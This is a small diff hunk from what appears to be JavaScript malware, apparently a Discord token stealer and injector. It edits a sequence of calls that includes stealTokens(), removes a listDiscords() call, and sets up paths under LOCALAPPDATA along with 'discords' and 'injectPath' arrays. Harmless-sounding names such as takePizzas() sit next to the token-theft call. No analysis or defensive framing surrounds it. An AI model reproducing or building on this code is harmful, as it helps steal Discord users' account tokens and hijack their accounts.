@@ -23,7 +23,7 @@ takePizzas();
 takeCheese();
 stealTokens()
 removePizzas();
-listDiscords();
+
 var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
